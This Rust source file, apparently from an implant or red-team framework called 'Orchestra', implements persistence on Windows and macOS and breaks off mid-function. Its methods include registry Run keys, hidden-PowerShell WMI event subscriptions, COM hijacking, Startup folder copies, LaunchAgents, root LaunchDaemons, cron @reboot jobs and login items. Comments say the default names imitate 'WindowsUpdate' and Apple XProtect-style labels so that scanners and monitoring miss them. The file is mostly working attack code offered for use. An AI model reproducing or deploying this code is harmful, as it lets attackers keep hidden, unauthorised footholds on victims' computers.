/// Advanced Persistence Module mapped to traits (FR-1 through FR-4)
use anyhow::Result;
use std::path::PathBuf;

#[allow(clippy::ptr_arg)]
pub trait Persist {
    fn install(&self, executable_path: &PathBuf) -> Result<()>;
    fn remove(&self) -> Result<()>;
    fn verify(&self) -> Result<bool>;
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn shell_quote_single(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

// ──────────────────────────────────────────────────────────────────────────────
// Windows persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(windows)]
pub use windows::*;
#[cfg(windows)]
pub mod windows {
    use super::Persist;
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;
    use std::ptr;

    // ── FR-1A: Registry Run Keys ──────────────────────────────────────────────
    pub struct RegistryRunKey {
        pub value_name: String,
    }

    impl Default for RegistryRunKey {
        fn default() -> Self {
            Self {
                value_name: "WindowsUpdate".to_string(),
            }
        }
    }

    impl Persist for RegistryRunKey {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
            use winapi::um::winreg::{
                RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
            };

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();
            let val_str = executable_path.to_string_lossy().to_string();
            let val_wide: Vec<u16> = val_str.encode_utf16().chain(std::iter::once(0)).collect();
            let val_name: Vec<u16> = self
                .value_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret =
                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                if ret != 0 {
                    return Err(anyhow!(
                        "RegistryRunKey::install: RegOpenKeyExW failed: {}",
                        ret
                    ));
                }
                let set_ret = RegSetValueExW(
                    hkey,
                    val_name.as_ptr(),
                    0,
                    REG_SZ,
                    val_wide.as_ptr() as _,
                    (val_wide.len() * 2) as u32,
                );
                RegCloseKey(hkey);
                if set_ret != 0 {
                    return Err(anyhow!(
                        "RegistryRunKey::install: RegSetValueExW failed: {}",
                        set_ret
                    ));
                }
            }
            log::info!(
                "RegistryRunKey::install: set '{}' = '{}'",
                self.value_name,
                val_str
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::um::winnt::KEY_WRITE;
            use winapi::um::winreg::{
                RegCloseKey, RegDeleteValueW, RegOpenKeyExW, HKEY_CURRENT_USER,
            };

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();
            let val_name: Vec<u16> = self
                .value_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret =
                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                if ret != 0 {
                    return Err(anyhow!(
                        "RegistryRunKey::remove: RegOpenKeyExW failed: {}",
                        ret
                    ));
                }
                RegDeleteValueW(hkey, val_name.as_ptr());
                RegCloseKey(hkey);
            }
            log::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::um::winnt::KEY_READ;
            use winapi::um::winreg::{
                RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER,
            };

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();
            let val_name: Vec<u16> = self
                .value_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let mut buf = vec![0u16; 256];
            let mut buf_len = (buf.len() * 2) as u32;
            let mut val_type: u32 = 0;

            unsafe {
                let mut hkey = ptr::null_mut();
                if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
                    return Ok(false);
                }
                let ret = RegQueryValueExW(
                    hkey,
                    val_name.as_ptr(),
                    ptr::null_mut(),
                    &mut val_type,
                    buf.as_mut_ptr() as _,
                    &mut buf_len,
                );
                RegCloseKey(hkey);
                Ok(ret == 0 && buf_len > 0)
            }
        }
    }

    // ── FR-1B: WMI Event Subscriptions ───────────────────────────────────────
    pub struct WmiSubscription {
        pub subscription_name: String,
    }

    impl Default for WmiSubscription {
        fn default() -> Self {
            Self {
                subscription_name: "UpdateCheck".to_string(),
            }
        }
    }

    // Escape a value for embedding inside a single-quoted PowerShell string.
    // In PowerShell single-quoted strings, only a single quote itself must be
    // escaped, and it is escaped by doubling it.
    fn escape_ps_string(s: &str) -> String {
        s.replace('\'', "''")
    }

    impl Persist for WmiSubscription {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            // WMI persistence via __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
            // Uses the WMI COM API (IWbemLocator → IWbemServices → ExecMethod)
            // Requires COM to be initialised. We call CoInitializeEx here.
            use winapi::shared::winerror::SUCCEEDED;
            use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
            use winapi::um::objbase::COINIT_MULTITHREADED;

            let exe_path = executable_path.to_string_lossy();
            let escaped_subscription_name = escape_ps_string(&self.subscription_name);
            let escaped_exe_path = escape_ps_string(exe_path.as_ref());
            log::info!(
                "WmiSubscription::install: registering '{}' for '{}'",
                self.subscription_name,
                exe_path
            );

            unsafe {
                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
                if !SUCCEEDED(hr) && hr != 0x00000001i32
                /* S_FALSE - already init */
                {
                    return Err(anyhow!(
                        "WmiSubscription::install: CoInitializeEx failed: 0x{:08X}",
                        hr
                    ));
                }

                // Use PowerShell as a fallback WMI registration path when the
                // full COM/IWbemServices path is not available (no wbemcli.h bindings).
                let filter_query = format!(
                    "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
                );
                let ps_cmd = format!(
                    "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{{Name='{}';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='{}'}};
                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{{Name='{}';CommandLineTemplate='{}'}};
                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{Filter=$filter;Consumer=$consumer}}",
                    escaped_subscription_name,
                    filter_query,
                    escaped_subscription_name,
                    escaped_exe_path
                );

                let status = std::process::Command::new("powershell")
                    .args(["-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
                    .status()
                    .map_err(|e| anyhow!("WmiSubscription: failed to spawn powershell: {}", e))?;

                // One CoInitializeEx → one CoUninitialize.
                CoUninitialize();

                if !status.success() {
                    return Err(anyhow!(
                        "WmiSubscription::install: powershell returned non-zero exit code"
                    ));
                }
                log::info!("WmiSubscription::install: registered successfully");
            }
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let escaped_subscription_name = escape_ps_string(&self.subscription_name);
            let ps_cmd = format!(
                r#"Get-WmiObject __EventFilter -Namespace root\subscription | Where-Object {{$_.Name -eq '{0}'}} | Remove-WmiObject;
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription | Where-Object {{$_.Name -eq '{0}'}} | Remove-WmiObject;
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {{$_.Filter -like '*{0}*'}} | Remove-WmiObject"#,
                escaped_subscription_name
            );
            let _ = std::process::Command::new("powershell")
                .args(["-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
                .status();
            log::info!(
                "WmiSubscription::remove: removed '{}'",
                self.subscription_name
            );
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let escaped_subscription_name = escape_ps_string(&self.subscription_name);
            let ps_cmd = format!(
                "(Get-WmiObject __EventFilter -Namespace root\\subscription | Where-Object {{$_.Name -eq '{}'}}) -ne $null",
                escaped_subscription_name
            );
            let out = std::process::Command::new("powershell")
                .args(["-NonInteractive", "-Command", &ps_cmd])
                .output()
                .map_err(|e| anyhow!("WmiSubscription::verify: {}", e))?;
            let stdout = String::from_utf8_lossy(&out.stdout).trim().to_lowercase();
            Ok(stdout == "true")
        }
    }

    // ── FR-1C: COM Hijacking ──────────────────────────────────────────────────
    pub struct ComHijacking {
        /// CLSID to hijack under HKCU\Software\Classes\CLSID\{...}\InprocServer32
        pub clsid: String,
    }

    impl Default for ComHijacking {
        fn default() -> Self {
            // Thumbnail cache handler — loaded by explorer.exe frequently
            // {C56A4180-65AA-11D0-A5CC-00A024159FAD} is the MIDI Sequence Object —
            // a legitimate inprocserver32 registration that is rarely monitored,
            // unlike the well-known thumbnail-cache CLSID.
            Self {
                clsid: "{C56A4180-65AA-11D0-A5CC-00A024159FAD}".to_string(),
            }
        }
    }

    impl Persist for ComHijacking {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if executable_path
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| !ext.eq_ignore_ascii_case("dll"))
                .unwrap_or(true)
            {
                return Err(anyhow!(
                    "ComHijacking::install requires an in-process DLL; refusing executable path '{}'",
                    executable_path.display()
                ));
            }
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
            use winapi::um::winreg::{
                RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
            };

            let subkey: Vec<u16> =
                format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
                    .encode_utf16()
                    .collect();
            let val: Vec<u16> = executable_path
                .to_string_lossy()
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegCreateKeyExW(
                    HKEY_CURRENT_USER,
                    subkey.as_ptr(),
                    0,
                    ptr::null_mut(),
                    0,
                    KEY_WRITE,
                    ptr::null_mut(),
                    &mut hkey,
                    ptr::null_mut(),
                );
                if ret != 0 {
                    return Err(anyhow!(
                        "ComHijacking::install: RegCreateKeyExW failed: {}",
                        ret
                    ));
                }
                RegSetValueExW(
                    hkey,
                    ptr::null(),
                    0,
                    REG_SZ,
                    val.as_ptr() as _,
                    (val.len() * 2) as u32,
                );
                // Set ThreadingModel
                let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
                let tm_val: Vec<u16> = "Apartment\0".encode_utf16().collect();
                RegSetValueExW(
                    hkey,
                    tm_name.as_ptr(),
                    0,
                    REG_SZ,
                    tm_val.as_ptr() as _,
                    ((tm_val.len() - 1) * 2) as u32,
                );
                RegCloseKey(hkey);
            }
            log::info!(
                "ComHijacking::install: CLSID {} → '{}'",
                self.clsid,
                executable_path.display()
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::um::winreg::{RegDeleteTreeW, HKEY_CURRENT_USER};

            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid)
                .encode_utf16()
                .collect();
            unsafe {
                RegDeleteTreeW(HKEY_CURRENT_USER, subkey.as_ptr());
            }
            log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::um::winnt::KEY_READ;
            use winapi::um::winreg::{RegCloseKey, RegOpenKeyExW, HKEY_CURRENT_USER};

            let subkey: Vec<u16> =
                format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
                    .encode_utf16()
                    .collect();
            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegOpenKeyExW(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut hkey);
                if ret == 0 {
                    RegCloseKey(hkey);
                    Ok(true)
                } else {
                    Ok(false)
                }
            }
        }
    }

    // ── FR-1D: Startup Folder ─────────────────────────────────────────────────
    pub struct StartupFolder;

    impl Persist for StartupFolder {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let mut target =
                dirs::config_dir().ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
            std::fs::copy(executable_path, &target)
                .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
            log::info!("StartupFolder::install: copied to '{}'", target.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let mut target = match dirs::config_dir() {
                Some(d) => d,
                None => return Ok(()),
            };
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
            let _ = std::fs::remove_file(&target);
            log::info!("StartupFolder::remove: removed '{}'", target.display());
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let mut target = match dirs::config_dir() {
                Some(d) => d,
                None => return Ok(false),
            };
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
            Ok(target.exists())
        }
    }

    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let cfg = crate::config::load_config()
            .unwrap_or_default()
            .persistence;

        if cfg.registry_run_key {
            if let Err(e) = RegistryRunKey::default().install(&exe) {
                log::warn!("RegistryRunKey install failed (non-fatal): {}", e);
            }
        }
        if cfg.startup_folder {
            if let Err(e) = StartupFolder.install(&exe) {
                log::warn!("StartupFolder install failed (non-fatal): {}", e);
            }
        }
        if cfg.wmi_subscription {
            if let Err(e) = WmiSubscription::default().install(&exe) {
                log::warn!("WmiSubscription install failed (non-fatal): {}", e);
            }
        }

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = RegistryRunKey::default().remove();
        let _ = StartupFolder.remove();
        let _ = WmiSubscription::default().remove();
        Ok(exe)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// macOS persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(target_os = "macos")]
pub use macos::*;
#[cfg(target_os = "macos")]
pub mod macos {
    use super::{Persist, shell_quote_single};
    use anyhow::{anyhow, Result};
    use std::path::{Path, PathBuf};

    /// LaunchAgent persistence.  The default label uses a value that blends
    /// with legitimate Apple software update agents; callers may override it.
    pub struct LaunchAgent {
        pub label: String,
        /// When `true`, uses `launchctl asuser <uid> launchctl bootstrap/bootout`
        /// for GUI-session bootstrap (LoginItem behaviour).
        /// When `false` (default), uses direct `launchctl bootstrap gui/<uid>`.
        pub asuser_bootstrap: bool,
    }

    impl Default for LaunchAgent {
        fn default() -> Self {
            // Use a label that resembles Apple's own XProtect/MRT agents,
            // which security scanners do not flag on sight.
            Self {
                label: "com.apple.xpc.system-updater".to_string(),
                asuser_bootstrap: false,
            }
        }
    }

    impl Persist for LaunchAgent {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let plist = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"#,
                label = self.label,
                exe = executable_path.display()
            );
            let mut plist_path =
                dirs::home_dir().ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
            // Create the directory if it does not exist.
            let agents_dir = plist_path.join("Library/LaunchAgents");
            std::fs::create_dir_all(&agents_dir)
                .map_err(|e| anyhow!("LaunchAgent::install: mkdir failed: {}", e))?;
            plist_path = agents_dir.join(format!("{}.plist", self.label));
            std::fs::write(&plist_path, plist)
                .map_err(|e| anyhow!("LaunchAgent::install: write failed: {}", e))?;
            // launchctl load -w is deprecated on macOS 10.10+; use the
            // bootstrap domain command instead.
            #[cfg(target_os = "macos")]
            {
                let uid = unsafe { libc::getuid() };
                let uid_str = uid.to_string();
                let gui_domain = format!("gui/{uid}");
                if self.asuser_bootstrap {
                    // GUI-session bootstrap via launchctl asuser (LoginItem pattern).
                    let _ = std::process::Command::new("launchctl")
                        .arg("asuser").arg(&uid_str)
                        .arg("launchctl").arg("bootout")
                        .arg(&gui_domain).arg(&plist_path)
                        .status();
                    let bootstrap = std::process::Command::new("launchctl")
                        .arg("asuser").arg(&uid_str)
                        .arg("launchctl").arg("bootstrap")
                        .arg(&gui_domain).arg(&plist_path)
                        .output()
                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl asuser bootstrap: {}", e))?;
                    if !bootstrap.status.success() {
                        let stderr = String::from_utf8_lossy(&bootstrap.stderr).trim().to_string();
                        let detail = if stderr.is_empty() {
                            "no stderr output".to_string()
                        } else {
                            stderr
                        };
                        return Err(anyhow!(
                            "LaunchAgent::install: failed to bootstrap '{}' via launchctl asuser: {}",
                            plist_path.display(),
                            detail
                        ));
                    }
                } else {
                    let status = std::process::Command::new("launchctl")
                        .args([
                            "bootstrap",
                            &gui_domain,
                            &plist_path.to_string_lossy(),
                        ])
                        .status()
                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl: {}", e))?;
                    if !status.success() {
                        // launchctl bootstrap returns 37 (ESRCH) when the service
                        // is already loaded; treat that as a non-fatal warning.
                        log::warn!(
                            "LaunchAgent::install: launchctl bootstrap returned non-zero (service may already be loaded)"
                        );
                    }
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                let _ = std::process::Command::new("launchctl")
                    .args(["load", "-w", &plist_path.to_string_lossy()])
                    .status();
            }
            log::info!("LaunchAgent::install: installed '{}'", plist_path.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let agents_dir = match dirs::home_dir() {
                Some(h) => h.join("Library/LaunchAgents"),
                None => return Ok(()),
            };
            let plist_path = agents_dir.join(format!("{}.plist", self.label));
            // launchctl unload is deprecated on macOS 10.10+; use bootout.
            #[cfg(target_os = "macos")]
            {
                let uid = unsafe { libc::getuid() };
                let uid_str = uid.to_string();
                let gui_domain = format!("gui/{uid}");
                if self.asuser_bootstrap {
                    let _ = std::process::Command::new("launchctl")
                        .arg("asuser").arg(&uid_str)
                        .arg("launchctl").arg("bootout")
                        .arg(&gui_domain).arg(&plist_path)
                        .status();
                } else {
                    let _ = std::process::Command::new("launchctl")
                        .args(["bootout", &gui_domain, &plist_path.to_string_lossy()])
                        .status();
                }
            }
            #[cfg(not(target_os = "macos"))]
            let _ = std::process::Command::new("launchctl")
                .args(["unload", &plist_path.to_string_lossy()])
                .status();
            let _ = std::fs::remove_file(&plist_path);
            log::info!("LaunchAgent::remove: unloaded '{}'", self.label);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let agents_dir = match dirs::home_dir() {
                Some(h) => h.join("Library/LaunchAgents"),
                None => return Ok(false),
            };
            let plist_path = agents_dir.join(format!("{}.plist", self.label));
            if !plist_path.exists() {
                return Ok(false);
            }
            if self.asuser_bootstrap {
                let uid = unsafe { libc::getuid() };
                let service = format!("gui/{}/{}", uid, self.label);
                let status = std::process::Command::new("launchctl")
                    .arg("asuser")
                    .arg(uid.to_string())
                    .arg("launchctl")
                    .arg("print")
                    .arg(&service)
                    .status()
                    .map_err(|e| anyhow!("LaunchAgent::verify: launchctl asuser print: {}", e))?;
                return Ok(status.success());
            }
            Ok(true)
        }
    }

    /// Cron-based fallback: @reboot entry, output redirected to /dev/null to
    /// prevent cron from mailing the user.
    pub struct CronJob;

    /// Marker appended to the cron entry so that only Orchestra's own @reboot
    /// entry is removed, never any pre-existing @reboot entries (H-15 fix).
    const MAC_CRON_MARKER: &str = "# orchestra-persist";

    /// Read current crontab as UTF-8 (lossy) text.
    ///
    /// Treat "no crontab for <user>" as an empty crontab so install/remove can
    /// safely proceed without shell pipelines.
    fn read_current_crontab() -> Result<String> {
        let out = std::process::Command::new("crontab")
            .arg("-l")
            .output()
            .map_err(|e| anyhow!("CronJob::read_current_crontab: {}", e))?;

        if out.status.success() {
            return Ok(String::from_utf8_lossy(&out.stdout).into_owned());
        }

        let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
        let stderr_lower = stderr.to_ascii_lowercase();
        if stderr_lower.contains("no crontab for") {
            return Ok(String::new());
        }

        let detail = if stderr.is_empty() {
            "no stderr output".to_string()
        } else {
            stderr
        };
        Err(anyhow!(
            "CronJob::read_current_crontab: crontab -l failed: {}",
            detail
        ))
    }

    /// Write the full crontab contents via `crontab -` using stdin piping.
    fn write_crontab(contents: &str) -> Result<()> {
        use std::io::Write;
        use std::process::Stdio;

        let mut child = std::process::Command::new("crontab")
            .arg("-")
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| anyhow!("CronJob::write_crontab: spawn failed: {}", e))?;

        {
            let stdin = child
                .stdin
                .as_mut()
                .ok_or_else(|| anyhow!("CronJob::write_crontab: missing stdin pipe"))?;
            stdin
                .write_all(contents.as_bytes())
                .map_err(|e| anyhow!("CronJob::write_crontab: stdin write failed: {}", e))?;
        }

        let out = child
            .wait_with_output()
            .map_err(|e| anyhow!("CronJob::write_crontab: wait failed: {}", e))?;
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
            let detail = if stderr.is_empty() {
                "no stderr output".to_string()
            } else {
                stderr
            };
            return Err(anyhow!(
                "CronJob::write_crontab: crontab - failed: {}",
                detail
            ));
        }
        Ok(())
    }

    fn filtered_crontab_without_marker(current: &str) -> String {
        let filtered = current
            .lines()
            .filter(|line| !line.contains(MAC_CRON_MARKER))
            .collect::<Vec<_>>()
            .join("\n");
        if filtered.is_empty() {
            String::new()
        } else {
            format!("{}\n", filtered)
        }
    }

    impl Persist for CronJob {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let quoted_exe = shell_quote_single(exe.as_ref());
            let entry = format!(
                "@reboot {} >/dev/null 2>&1 {}",
                quoted_exe, MAC_CRON_MARKER
            );

            let current = read_current_crontab()?;
            let mut updated = filtered_crontab_without_marker(&current);
            updated.push_str(&entry);
            updated.push('\n');
            write_crontab(&updated)?;

            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let current = read_current_crontab()?;
            let updated = filtered_crontab_without_marker(&current);
            write_crontab(&updated)?;
            log::info!("CronJob::remove: removed orchestra @reboot entry");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let current = read_current_crontab()?;
            Ok(current.contains(MAC_CRON_MARKER))
        }
    }

    /// Install both LaunchAgent (preferred) and cron fallback.
    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let cfg = crate::config::load_config()
            .unwrap_or_default()
            .persistence;

        if cfg.launch_agent {
            if let Err(e) = LaunchAgent::default().install(&exe) {
                log::warn!("LaunchAgent install failed (non-fatal): {}", e);
            }
        }
        if cfg.cron_job {
            if let Err(e) = CronJob.install(&exe) {
                log::warn!("CronJob install failed (non-fatal): {}", e);
            }
        }
        if cfg.launch_daemon {
            if let Err(e) = LaunchDaemon::default().install(&exe) {
                log::warn!("LaunchDaemon install failed (non-fatal): {}", e);
            }
        }
        if cfg.login_item {
            if let Err(e) = LoginItem::default().install(&exe) {
                log::warn!("LoginItem install failed (non-fatal): {}", e);
            }
        }

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = LaunchAgent::default().remove();
        let _ = CronJob.remove();
        let _ = LaunchDaemon::default().remove();
        let _ = LoginItem::default().remove();
        Ok(exe)
    }

    // ── 5.1: LaunchDaemon (system-level, requires root) ───────────────────────

    /// LaunchDaemon persistence (system-level, runs as root on boot).
    /// Requires elevated privileges; the plist is placed in /Library/LaunchDaemons/.
    pub struct LaunchDaemon {
        pub label: String,
    }

    impl Default for LaunchDaemon {
        fn default() -> Self {
            Self {
                label: "com.apple.xpc.mdmclient-helper".to_string(),
            }
        }
    }

    impl Persist for LaunchDaemon {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            // Root check: /Library/LaunchDaemons is root-owned.
            #[cfg(target_os = "macos")]
            unsafe {
                if libc::getuid() != 0 {
                    return Err(anyhow!("LaunchDaemon::install: requires root"));
                }
            }
            let plist = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"#,
                label = self.label,
                exe = executable_path.display()
            );
            let daemons_dir = std::path::Path::new("/Library/LaunchDaemons");
            std::fs::create_dir_all(daemons_dir)
                .map_err(|e| anyhow!("LaunchDaemon::install: mkdir: {}", e))?;
            let plist_path = daemons_dir.join(format!("{}.plist", self.label));
            std::fs::write(&plist_path, plist)
                .map_err(|e| anyhow!("LaunchDaemon::install: write: {}", e))?;
            #[cfg(target_os = "macos")]
            {
                let _ = std::process::Command::new("launchctl")
                    .args(["bootstrap", "system", &plist_path.to_string_lossy()])
                    .status();
            }
            log::info!(
                "LaunchDaemon::install: installed '{}'",
                plist_path.display()
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let plist_path = std::path::Path::new("/Library/LaunchDaemons")
                .join(format!("{}.plist", self.label));
            #[cfg(target_os = "macos")]
            {
                let _ = std::process::Command::new("launchctl")
                    .args(["bootout", "system", &plist_path.to_string_lossy()])
                    .status();
            }
            let _ = std::fs::remove_file(&plist_path);
            log::info!("LaunchDaemon::remove: removed '{}'", self.label);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            Ok(std::path::Path::new("/Library/LaunchDaemons")
                .join(format!("{}.plist", self.label))
                .exists())
        }
    }

    // ── 5.1: LoginItems ───────────────────────────────────────────────────────

    type CFStringRef = *const std::ffi::c_void;
    const K_CFSTRING_ENCODING_UTF8: u32 = 0x0800_0100;

    #[link(name = "ServiceManagement", kind = "framework")]
    extern "C" {
        fn SMLoginItemSetEnabled(identifier: CFStringRef, enabled: u8) -> u8;
    }

    #[link(name = "CoreFoundation", kind = "framework")]
    extern "C" {
        fn CFStringCreateWithCString(
            alloc: *const std::ffi::c_void,
            c_str: *const std::os::raw::c_char,
            encoding: u32,
        ) -> CFStringRef;
        fn CFRelease(cf: *const std::ffi::c_void);
    }

    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    enum LoginItemStrategy {
        ServiceManagement,
        LaunchAgentFallback,
    }

    struct SmHelperContext {
        helper_bundle_path: PathBuf,
        helper_bundle_id: String,
    }

    /// LoginItems persistence with automatic strategy selection.
    ///
    /// Strategy selection:
    /// 1) If the executable is running from inside an `.app` bundle, use
    ///    ServiceManagement (`SMLoginItemSetEnabled`) and require a helper app
    ///    at:
    ///    `<MainApp>.app/Contents/Library/LoginItems/<app_name>.app`
    /// 2) Otherwise, fall back to the existing GUI LaunchAgent strategy
    ///    (`asuser_bootstrap: true`).
    ///
    /// ServiceManagement requirement:
    /// The helper login item app **must** be embedded in
    /// `Contents/Library/LoginItems`. If it is missing, installation returns an
    /// error describing the expected location.
    pub struct LoginItem {
        pub app_name: String,
    }

    impl Default for LoginItem {
        fn default() -> Self {
            Self {
                app_name: "System Update Helper".to_string(),
            }
        }
    }

    impl LoginItem {
        fn strategy_for_executable(executable_path: &Path) -> LoginItemStrategy {
            if Self::app_bundle_root(executable_path).is_some() {
                LoginItemStrategy::ServiceManagement
            } else {
                LoginItemStrategy::LaunchAgentFallback
            }
        }

        fn app_bundle_root(executable_path: &Path) -> Option<PathBuf> {
            let mut cur = executable_path.parent();
            while let Some(p) = cur {
                let is_app = p
                    .extension()
                    .and_then(|e| e.to_str())
                    .map(|e| e.eq_ignore_ascii_case("app"))
                    .unwrap_or(false);
                if is_app {
                    return Some(p.to_path_buf());
                }
                cur = p.parent();
            }
            None
        }

        fn helper_bundle_path_for_executable(&self, executable_path: &Path) -> Option<PathBuf> {
            let app_root = Self::app_bundle_root(executable_path)?;
            Some(
                app_root
                    .join("Contents")
                    .join("Library")
                    .join("LoginItems")
                    .join(format!("{}.app", self.app_name)),
            )
        }

        fn read_helper_bundle_id(helper_bundle_path: &Path) -> Result<String> {
            let info_plist = helper_bundle_path.join("Contents").join("Info.plist");
            if !info_plist.exists() {
                return Err(anyhow!(
                    "LoginItem: missing helper Info.plist at '{}'",
                    info_plist.display()
                ));
            }

            let out = std::process::Command::new("defaults")
                .arg("read")
                .arg(&info_plist)
                .arg("CFBundleIdentifier")
                .output()
                .map_err(|e| anyhow!("LoginItem: defaults read CFBundleIdentifier: {}", e))?;

            if !out.status.success() {
                let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
                let detail = if stderr.is_empty() {
                    "no stderr output".to_string()
                } else {
                    stderr
                };
                return Err(anyhow!(
                    "LoginItem: failed to read helper bundle identifier from '{}': {}",
                    info_plist.display(),
                    detail
                ));
            }

            let id = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if id.is_empty() {
                return Err(anyhow!(
                    "LoginItem: helper CFBundleIdentifier is empty in '{}'",
                    info_plist.display()
                ));
            }
            Ok(id)
        }

        fn resolve_sm_helper_context(&self, executable_path: &Path) -> Result<SmHelperContext> {
            let helper_bundle_path = self
